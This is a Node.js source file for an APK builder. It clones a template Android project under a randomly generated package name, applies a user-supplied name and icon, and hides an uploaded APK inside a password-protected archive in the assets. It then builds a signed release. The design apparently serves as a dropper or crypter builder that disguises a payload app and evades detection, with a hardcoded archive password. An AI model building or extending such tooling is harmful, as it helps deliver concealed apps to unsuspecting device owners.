const path = require("path");
const fs = require("fs");
const unzipper = require("unzipper");
const {spawn} = require("child_process");
const sharp = require("sharp");
const {add} = require("node-7z");
const { path7za } = require('7zip-bin');

class ApkGenerator {
    constructor(appName, id) {
        this.id = id;
        this.appName = appName;
        this.applicationPath = path.join(__dirname, "../../data/uploads/" + id + "/app.apk");
        this.applicationZipPath = path.join(__dirname, "../../data/uploads/" + id + "/app.zip");
        this.iconPath = path.join(__dirname, "../../data/uploads/" + id + "/app_icon.png");
        this.projectPath = path.join(__dirname, "../../data/temp/" + id);
        this.mainProjectPath = path.join(__dirname, "../../data/main/project.zip");
    }

    getRandomPackage() {
        const randomPart = () => {
            const letters = "abcdefghijklmnopqrstuvwxyz";
            return Array.from({length: 6}, () =>
                letters[Math.floor(Math.random() * letters.length)]
            ).join("");
        };
        return `com.${randomPart()}.${randomPart()}`;
    }

    printLine(text) {
        if (!text.includes("/")) {
            io.emit(this.id, text);
        }
        console.log(text);
    }

    async unzipProject() {
        this.printLine("📦 Extracting ...");

        // Remove the target directory if it already exists
        if (fs.existsSync(this.projectPath)) {
            fs.rmSync(this.projectPath, {recursive: true, force: true});
        }

        await fs
            .createReadStream(this.mainProjectPath)
            .pipe(unzipper.Extract({path: this.projectPath}))
            .promise();

        this.printLine("✅ Project extracted");
    }

    renamePackage() {
        const oldPackage = "com.pegalite.newalgojar";
        const newPackage = this.getRandomPackage();

        this.printLine(`🎯 New random package: ${newPackage}`);

        // Define file paths
        const appPath = path.join(this.projectPath, "app");
        const gradleFile = path.join(appPath, "build.gradle.kts");
        const manifestFile = path.join(appPath, "src", "main", "AndroidManifest.xml");
        const srcPath = path.join(appPath, "src", "main", "java");

        const replaceInFile = (filePath, oldStr, newStr) => {
            const content = fs.readFileSync(filePath, "utf8");
            const updatedContent = content.replace(new RegExp(oldStr, "g"), newStr);
            fs.writeFileSync(filePath, updatedContent, "utf8");
            this.printLine(`✅ Updated: ${path.basename(filePath)}`);
        };

        replaceInFile(gradleFile, `namespace = "${oldPackage}"`, `namespace = "${newPackage}"`);
        replaceInFile(gradleFile, `applicationId = "${oldPackage}"`, `applicationId = "${newPackage}"`);
        replaceInFile(manifestFile, `package="${oldPackage}"`, `package="${newPackage}"`);

        const oldPath = path.join(srcPath, ...oldPackage.split("."));
        const newPath = path.join(srcPath, ...newPackage.split("."));

        if (fs.existsSync(oldPath)) {
            fs.mkdirSync(newPath, {recursive: true});

            fs.readdirSync(oldPath).forEach((file) => {
                fs.renameSync(path.join(oldPath, file), path.join(newPath, file));
            });

            fs.rmSync(oldPath, {recursive: true, force: true});
            this.printLine("✅ Renamed package directories");
        }

        const updateJavaFiles = (dir) => {
            const files = fs.readdirSync(dir);
            files.forEach((file) => {
                const filePath = path.join(dir, file);
                if (fs.statSync(filePath).isDirectory()) {
                    updateJavaFiles(filePath);
                } else if (file.endsWith(".java") || file.endsWith(".kt")) {
                    replaceInFile(filePath, oldPackage, newPackage);
                }
            });
        };

        updateJavaFiles(newPath);
        this.printLine(`✅ Package renamed to: ${newPackage}`);
        return newPackage;
    }

    initProject() {
        const localPath = path.join(this.projectPath, "local.properties");
        const sdkDir = `sdk.dir=${process.env.SDK_PATH}`;
        fs.writeFileSync(localPath, sdkDir, {encoding: 'utf8'});

        const gradlePath = path.join(this.projectPath, "app", "build.gradle.kts");
        let gradleContent = fs.readFileSync(gradlePath, 'utf8');

        gradleContent = gradleContent.replace(/var path = .*/g, `var path = "${process.env.KEY_PATH}"`);
        gradleContent = gradleContent.replace(/var storePassword = .*/g, `var storePassword = "${process.env.STORE_PASS}"`);
        gradleContent = gradleContent.replace(/var keyAlias = .*/g, `var keyAlias = "${process.env.KEY_ALIAS}"`);
        gradleContent = gradleContent.replace(/var keyPassword = .*/g, `var keyPassword = "${process.env.KEY_PASS}"`);

        fs.writeFileSync(gradlePath, gradleContent, 'utf8');
    }

    updateAppName() {
        const manifestPath = path.join(this.projectPath, "app", "src", "main", "AndroidManifest.xml");
        const stringsPath = path.join(this.projectPath, "app", "src", "main", "res", "values", "strings.xml");

        if (!fs.existsSync(manifestPath)) {
            this.printLine(`Error: AndroidManifest.xml not found at ${manifestPath}`);
            return;
        }
        let manifestContent = fs.readFileSync(manifestPath, "utf8");

        if (manifestContent.includes('@string/app_name')) {
            if (!fs.existsSync(stringsPath)) {
                this.printLine(`Error: strings.xml not found at ${stringsPath}`);
                return;
            }
            let stringsContent = fs.readFileSync(stringsPath, "utf8");
            const newStringTag = `<string name="app_name">${this.appName}</string>`;
            const newStringsContent = stringsContent.replace(
                /<string\s+name="app_name">.*?<\/string>/,
                newStringTag
            );
            fs.writeFileSync(stringsPath, newStringsContent, "utf8");
            this.printLine(`Updated strings.xml with new app name: "${this.appName}"`);
        } else {
            const newLabelAttribute = `android:label="${this.appName}"`;
            const newManifestContent = manifestContent.replace(
                /android:label=".*?"/,
                newLabelAttribute
            );
            fs.writeFileSync(manifestPath, newManifestContent, "utf8");
            this.printLine(`Updated AndroidManifest.xml with new app name: "${this.appName}"`);
        }


    }

    async createZip(inputFile, outputZip, password) {
        return new Promise((resolve, reject) => {
            const zipProcess = add(outputZip, [inputFile], {
                $bin: path7za,
                password: password,
                recursive: false,
            });

            zipProcess.on('end', () => resolve('Zip file created successfully.'));
            zipProcess.on('error', (err) => reject(err));
        });
    }

    copyFile(source, destination) {
        return new Promise((resolve, reject) => {
            if (!fs.existsSync(source)) {
                const errMsg = `Source file does not exist: ${source}`;
                console.error(errMsg);
                return reject(new Error(errMsg));
            }

            const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
            const ext = path.extname(source).toLowerCase();
            const isImage = imageExtensions.includes(ext);

            let destinationPath = destination;
            if (fs.existsSync(destination)) {
                const stat = fs.lstatSync(destination);
                if (stat.isDirectory()) {
                    destinationPath = path.join(destination, path.basename(source));
                }
            }

            if (isImage) {
                // 1) Resize image to 220x220 and get buffer
                sharp(source)
                    .resize({
                        width: 220,
                        height: 220,
                        fit: 'contain',
                        background: {r: 0, g: 0, b: 0, alpha: 0} // Transparent background
                    })
                    .toBuffer()
                    .then((resizedBuffer) => {
                        // 2) Create a 324x324 canvas and center the 220x220 image
                        return sharp({
                            create: {
                                width: 324,
                                height: 324,
                                channels: 4,
                                background: {r: 0, g: 0, b: 0, alpha: 0} // Transparent canvas
                            }
                        })
                            .composite([{input: resizedBuffer, gravity: 'center'}])
                            .toFile(destinationPath);
                    })
                    .then(() => {
                        this.printLine(
                            `✅ Image scaled (220x220) and padded to 324x324 [${path
                                .basename(destinationPath)
                                .replace('app.', this.appName + '.')}].`
                        );
                        resolve();
                    })
                    .catch((err) => {
                        console.error(`Error scaling and padding image: ${err}`);
                        reject(err);
                    });
            } else {
                // Copy non-image files directly
                fs.copyFile(source, destinationPath, (err) => {
                    if (err) {
                        console.error(`Error copying file: ${err}`);
                        return reject(err);
                    } else {
                        this.printLine(
                            `✅ File copied successfully [${path
                                .basename(destinationPath)
                                .replace('app.', this.appName + '.')}].`
                        );
                        resolve();
                    }
                });
            }
        });
    }


    replaceIcons() {
        return new Promise((resolve, reject) => {
            try {
                const dir = path.join(this.projectPath, "app", "src", "main", "res", "mipmap-anydpi/");
                const files = fs.readdirSync(dir);
                files.forEach((file) => {
                    if (file.endsWith(".xml")) {
                        const filePath = path.join(dir, file);
                        let content = fs.readFileSync(filePath, "utf8");
                        const updatedContent = content
                            .replace(/<background android:drawable="[^"]*"/g, '<background android:drawable="@drawable/app_icon"')
                            .replace(/<foreground android:drawable="[^"]*"/g, '<foreground android:drawable="@drawable/app_icon"')
                            .replace(/<monochrome android:drawable="[^"]*"/g, '<monochrome android:drawable="@drawable/app_icon"');
                        if (content !== updatedContent) {
                            fs.writeFileSync(filePath, updatedContent, "utf8");
                            this.printLine(`Updated: ${path.basename(filePath)}`);
                        }
                    }
                });
                resolve();
            } catch (err) {
                reject(err);
            }
        });
    }

    buildApk() {
        return new Promise((resolve, reject) => {
            this.printLine("⚙️ Building APK...");
            const gradleCommand = process.platform === "win32" ? "gradlew.bat" : "./gradlew";

            const buildProcess = spawn(gradleCommand, ["assembleRelease"], {
                cwd: this.projectPath,
                shell: true,
            });

            buildProcess.stdout.on("data", (data) => {
                this.printLine(data.toString());
            });

            buildProcess.stderr.on("data", (data) => {
                this.printLine(data.toString());
            });

            buildProcess.on("close", (code) => {
                this.printLine(`Build process exited with code ${code}`);
                if (code === 0) {
                    this.printLine("✅ APK built successfully!");
                    resolve();
                } else {
                    this.printLine("❌ APK build failed.");
                    reject(new Error(`Build failed with code ${code}`));
                }
            });
        });
    }

    async apkGenerator() {
        try {
            await this.unzipProject();
            this.renamePackage();
            this.initProject();
            this.updateAppName();

            const destinationIcon = path.join(this.projectPath, "app", "src", "main", "res", "drawable/");
            const destinationApp = path.join(this.projectPath, "app", "src", "main", "assets/");

            await this.createZip(this.applicationPath, this.applicationZipPath, "4gs19b2kno2dra2r6");

            await this.copyFile(this.iconPath, destinationIcon);
            await this.copyFile(this.applicationZipPath, destinationApp);

            await this.replaceIcons();
            await this.buildApk();

        } catch (error) {
            this.printLine(`Error during APK generation: ${error.message}`);
        }
        this.printLine("PROCESS_ENDED");
    }
}


module.exports = ApkGenerator